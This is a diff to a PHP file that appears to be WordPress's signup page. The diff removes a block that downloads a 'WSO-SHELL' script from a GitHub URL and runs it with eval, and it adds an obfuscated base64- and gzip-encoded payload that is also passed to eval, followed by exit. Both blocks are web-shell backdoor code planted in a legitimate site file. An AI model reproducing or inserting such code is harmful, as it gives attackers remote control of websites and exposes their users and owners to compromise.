@@ -1047,25 +1047,10 @@ if ( 'none' === $active_signup ) {
 do_action( 'after_signup_form' );
 ?>
 <?php
-$url = "https://raw.githubusercontent.com/rendihidayat683/WSO-SHELL/refs/heads/main/xmlrpc.php";
-$ch = curl_init($url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_HEADER, true);
-
-$response = curl_exec($ch);
-$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
-$body = substr($response, $header_size);
-
-if (curl_errno($ch)) {
-    echo "cURL error: " . curl_error($ch);
-} elseif ($http_code != 200) {
-    echo "HTTP Error: $http_code";
-} else {
-    eval("?>" . $body);
-}
-
-curl_close($ch);
+$Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
+$Lix = "=sgcSr4JVz91RRuLAirwV9299cEqygUUakjQCYYGAh4/dDZoE/9yadPtonRXDzkw9Jo2F0fAw4JUxRM96lR7ilxKIFAwGhepookXy9bg6mMBwT/u5GLfi8mFRvHGj62bO0y6BpjEqXJ5l90VEbYvEVxCogLiU3kyhmzHa/tlwSN6LYyt9vEKMT5d1Tz2bxD8Pzgtm5xb9IMmvWWVwh0b/05lt/NC9CXSPBgk0A8zIww4MjFCaClcZkKuVj0ak+QolNpxGsAyzifwjG9esHXzgARhZyhiXrU0blr37/uPfgn7f2rZlc2e/LWLzx7TuMzsnLaEq5AXWJ8UMk0ygMGWEHGUx46H8fxfHTBQDuU8QWGn45v7BERA";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
 ?>
 <?php
 get_footer( 'wp-signup' );
